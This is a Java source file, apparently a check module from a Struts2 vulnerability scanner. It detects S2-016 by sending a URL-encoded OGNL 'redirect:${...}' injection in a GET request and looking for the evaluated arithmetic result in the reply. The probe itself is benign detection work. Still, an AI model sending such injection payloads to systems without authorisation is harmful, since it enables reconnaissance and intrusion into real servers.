package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_016 implements Check {
    public String printInfo(){
        String info = "[+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {

        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "?redirect%3A%24%7B" + number1 + "%2A" + number2 + "%7D";

        int number = number1 * number2;
        if (path==null){
            path = "/index.action";
        }else if(!path.endsWith(".action")){
            path = path+"index.action";
        }

        String url = protocol + "://" + host + ":" + port + path + poc;


        try {
            HttpResult result = HttpClient.get(url);
            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m = p.matcher(result.getData());

            if (m.find()) {
                return true;
            } else {
                return false;
            }
        }catch (Exception e){
            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m = p.matcher(e.toString());

            if (m.find()) {
                return true;
            } else {
                return false;
            }
        }



    }

}
